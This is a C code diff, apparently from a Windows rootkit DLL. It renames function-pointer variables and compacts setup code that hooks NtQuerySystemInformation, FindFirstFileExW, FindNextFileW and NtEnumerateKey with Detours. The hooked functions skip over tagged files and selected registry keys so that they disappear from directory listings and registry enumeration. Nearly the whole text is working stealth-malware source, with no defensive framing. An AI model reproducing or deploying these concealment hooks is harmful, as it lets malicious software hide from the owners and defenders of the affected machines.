@@ -44,13 +44,13 @@ typedef HANDLE(WINAPI *FFFEx)(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevel
 HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags);
 
 FFFEx oldFFFEx;
-FFFEx hookFFFEx;
+FFFEx originalFFFEx;
 
 typedef BOOL(WINAPI *FNFW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
 BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);
 
 FNFW oldFNFW;
-FNFW hookFNFW;
+FNFW originalFNFW;
 
 /* NT ENUMERATE KEY */
 
@@ -65,7 +65,7 @@ typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
     );
 
 TD_NtEnumerateKey oldNtEnumerateKey;
-TD_NtEnumerateKey hookNtEnumerateKey;
+TD_NtEnumerateKey originalNtEnumerateKey;
 
 typedef LONG (WINAPI *TD_RtlCompareUnicodeString)(
     _In_ PCUNICODE_STRING String1,
@@ -227,7 +227,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
     OBJECT_ATTRIBUTES ObjectAttributes;
 
     if (KeyInformationClass == KeyBasicInformation || KeyInformationClass == KeyNodeInformation) {
-        ret = hookNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+        ret = originalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
         if (NT_SUCCESS(ret)) {
             uStr_tmp.Buffer = (PWSTR)getKeyName(KeyInformation, KeyInformationClass);
             uStr_tmp.Length = (USHORT)getKeyNameLength(KeyInformation, KeyInformationClass);
@@ -243,7 +243,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
             }
 
             if (tmpIndex != Index) {
-                ret = hookNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
+                ret = originalNtEnumerateKey(KeyHandle, tmpIndex, KeyInformationClass, KeyInformation, Length, ResultLength);
                 if (ret != STATUS_SUCCESS)
                     return ret;
                 if (mustHideReg(uStr_tmp))
@@ -251,7 +251,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
             }
 
             do {
-                ret = hookNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
+                ret = originalNtEnumerateKey(KeyHandle, tmpIndex++, KeyInformationClass, KeyInformation, Length, ResultLength);
                 if (ret != STATUS_SUCCESS)
                     return ret;
                 if (!mustHideReg(uStr_tmp))
@@ -261,7 +261,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
             } while (TRUE);
         }
     }
-    return hookNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
+    return originalNtEnumerateKey(KeyHandle, Index + tmpInt, KeyInformationClass, KeyInformation, Length, ResultLength);
 }
 
 	BOOL APIENTRY DllMain(HMODULE hModule,
@@ -274,21 +274,17 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 		HMODULE NtDll = LoadLibrary("ntdll.dll");
 		HMODULE Kernel32 = LoadLibrary("kernel32.dll");
 
-		switch (ul_reason_for_call)
-		{
-		case DLL_PROCESS_ATTACH:
-            SetOldHookNtQuery((TD_NtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation"));
-            SetHookNtQuery((TD_NtQuerySystemInformation)DetourFunction((PBYTE)GetOldHookNtQuery(), (PBYTE)NewNtQuerySystemInformation));
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+            SetNtQuery((TD_NtQuerySystemInformation)DetourFunction((PBYTE)(TD_NtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation"), (PBYTE)NewNtQuerySystemInformation));
 
-			oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
-			hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);
+            originalFFFEx = (FFFEx)DetourFunction((PBYTE)((FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW")), (PBYTE)elFFFEx);
 
-			oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
-			hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
+            originalFNFW = (FNFW)DetourFunction((PBYTE)((FNFW)GetProcAddress(Kernel32, "FindNextFileW")), (PBYTE)elFNFW);
 
-			oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
-			hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
-
+            originalNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)(TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey"), (PBYTE)NewNtEnumerateKey);
+        
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
 		case DLL_PROCESS_DETACH:
@@ -299,7 +295,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 
 	HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
 	{
-		HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
+		HANDLE ret = originalFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
 		if (ret)
 		{
 			WIN32_FIND_DATAW *f = (WIN32_FIND_DATAW *)lpFindFileData;
@@ -323,7 +319,7 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 
 			if (strstr(name, FILE_TAG) != 0)
 			{
-				hookFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
+				originalFNFW(ret, (WIN32_FIND_DATAW *)lpFindFileData);
 			}
 		}
 
@@ -393,11 +389,11 @@ NTSTATUS NTAPI NewNtEnumerateKey(
 		WideCharToMultiByte(CP_ACP, 0, finddata->cFileName, MAX_PATH, szFileName, MAX_PATH, NULL, NULL);
 		path_strip_filename2(szFileName);
 		memcpy(szBuffer, szFileName, 6);
-		BOOL ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
+		BOOL ret = originalFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
 		if (lstrcmpi(name, "a") == 0 || strcmp(name, "test.txt") == 0)
 		{
 			MessageBox(0, "FOUND", "HookTest", MB_OK | MB_ICONERROR);
-			ret = hookFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
+			ret = originalFNFW(findfile, (WIN32_FIND_DATAW *)finddata);
 		}
 		return ret;
 	}
